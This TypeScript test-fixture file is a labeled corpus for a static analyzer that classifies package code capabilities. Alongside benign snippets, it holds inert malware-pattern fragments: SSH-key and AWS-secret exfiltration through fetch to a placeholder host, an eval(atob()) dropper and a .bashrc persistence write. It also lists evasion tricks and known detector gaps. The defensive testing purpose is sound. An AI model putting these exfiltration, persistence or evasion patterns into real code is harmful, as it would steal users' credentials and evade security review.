// Labeled ground-truth corpus. Each fixture is hand-labeled with the TRUE
// capabilities a reviewer would assign; analyze() is measured against it.
// Malware-pattern fixtures are INERT (no live payload/C2) — only the shape.
import type { Fixture, Label } from "./types";

const L = (capabilities: Label["capabilities"], unverifiable = false): Label => ({ capabilities, unverifiable });

export const FIXTURES: Fixture[] = [
  // --- benign ---
  { name: "lodash", kind: "benign", code: `const _ = require('lodash');`, expected: L([]) },
  { name: "fs-read", kind: "benign", code: `const fs = require('fs');\nfs.readFileSync('./c.json', 'utf8');`, expected: L(["FILESYSTEM"]) },
  { name: "path-util", kind: "benign", code: `const path = require('path');\npath.join('a', 'b');`, expected: L([]) },
  { name: "events", kind: "benign", code: `const { EventEmitter } = require('events');`, expected: L([]) },
  { name: "crypto-hash", kind: "benign", code: `const crypto = require('crypto');\ncrypto.createHash('sha256');`, expected: L(["CRYPTO"]) },
  { name: "api-client", kind: "benign", code: `const https = require('https');\nconst k = process.env.API_KEY;\nhttps.get('https://api.co');`, expected: L(["NETWORK", "ENV_SECRETS"]) },
  { name: "umd-typeof", kind: "benign", code: `if (typeof require !== 'undefined') { run(); }`, expected: L([]) },
  { name: "credentials-word", kind: "benign", code: `const msg = 'please enter your credentials';`, expected: L([]) },

  // --- single capabilities ---
  { name: "net", kind: "synthetic", code: `const net = require('net');`, expected: L(["NETWORK"]) },
  { name: "dns-promises", kind: "synthetic", code: `const dns = require('dns/promises');`, expected: L(["NETWORK"]) },
  { name: "child_process", kind: "synthetic", code: `const { exec } = require('child_process');`, expected: L(["EXEC"]) },
  { name: "worker_threads", kind: "synthetic", code: `const w = require('worker_threads');`, expected: L(["EXEC"]) },
  { name: "fetch-global", kind: "synthetic", code: `fetch('https://x');`, expected: L(["NETWORK"]) },
  { name: "process-env", kind: "synthetic", code: `const t = process.env.TOKEN;`, expected: L(["ENV_SECRETS"]) },
  { name: "node-prefix", kind: "synthetic", code: `import fs from 'node:fs';`, expected: L(["FILESYSTEM"]) },

  // --- inert malware patterns (dangerous) ---
  { name: "exfil-ssh", kind: "malware-pattern", code: `const fs = require('fs');\nconst k = fs.readFileSync('/home/u/.ssh/id_rsa');\nfetch('http://x/?k=' + k);`, expected: L(["FILESYSTEM", "ENV_SECRETS", "NETWORK"]) },
  { name: "dropper", kind: "malware-pattern", code: `const cp = require('child_process');\nconst https = require('https');\neval(atob(p));`, expected: L(["EXEC", "NETWORK"], true) },
  { name: "env-steal-obf", kind: "malware-pattern", code: `const k = process.env.AWS_SECRET_ACCESS_KEY;\nconst u = atob('aHR0cDov');\nfetch(u + k);`, expected: L(["ENV_SECRETS", "NETWORK"], true) },
  { name: "startup-persist", kind: "malware-pattern", code: `const fs = require('fs');\nfs.writeFileSync(home + '/.bashrc', payload);`, expected: L(["FILESYSTEM"]) },
  { name: "passwd-exfil", kind: "malware-pattern", code: `const fs = require('fs');\nfs.readFileSync('/etc/passwd');\nconst https = require('https');`, expected: L(["FILESYSTEM", "ENV_SECRETS", "NETWORK"]) },

  // --- evasion (must be UNVERIFIABLE, never silently clean) ---
  { name: "dynamic-require", kind: "evasion", code: `const m = require(name);`, expected: L([], true) },
  { name: "concat-require", kind: "evasion", code: `const m = require('child_' + 'process');`, expected: L([], true) },
  { name: "module-require", kind: "evasion", code: `module.require('fs');`, expected: L([], true) },
  { name: "comma-require", kind: "evasion", code: `const r = (0, require)('fs');`, expected: L([], true) },
  { name: "computed-global", kind: "evasion", code: `globalThis['pr' + 'ocess'];`, expected: L([], true) },
  { name: "eval", kind: "evasion", code: `eval(x);`, expected: L([], true) },
  { name: "function-ctor", kind: "evasion", code: `const f = new Function('a', 'return a');`, expected: L([], true) },
  { name: "buffer-base64", kind: "evasion", code: `const c = Buffer.from(data, 'base64');\neval(c.toString());`, expected: L([], true) },

  // caught despite obfuscation (not a false-safe)
  { name: "template-hidden-require", kind: "evasion", code: "const x = `${require('child_process').execSync('id')}`;", expected: L(["EXEC"]) },
];

// Documented, TRACKED false-safe gaps the analyzer does NOT yet catch. Run
// NON-GATING so the perfect in-scope numbers are not misleading. When one is
// fixed, the tracking test flips and forces moving it in-scope.
export const KNOWN_GAPS: Fixture[] = [
  { name: "gap-window-computed-eval", kind: "evasion", code: `window['eval']('code');`, expected: L([], true) },
  { name: "gap-self-computed-eval", kind: "evasion", code: `self['eval']('code');`, expected: L([], true) },
  { name: "gap-window-dot-eval", kind: "evasion", code: `window.eval('code');`, expected: L([], true) },
  { name: "gap-settimeout-string", kind: "evasion", code: `setTimeout('alert(1)', 100);`, expected: L([], true) },
  { name: "gap-process-computed-env", kind: "evasion", code: `const s = process['env']['SECRET'];`, expected: L(["ENV_SECRETS"]) },
];
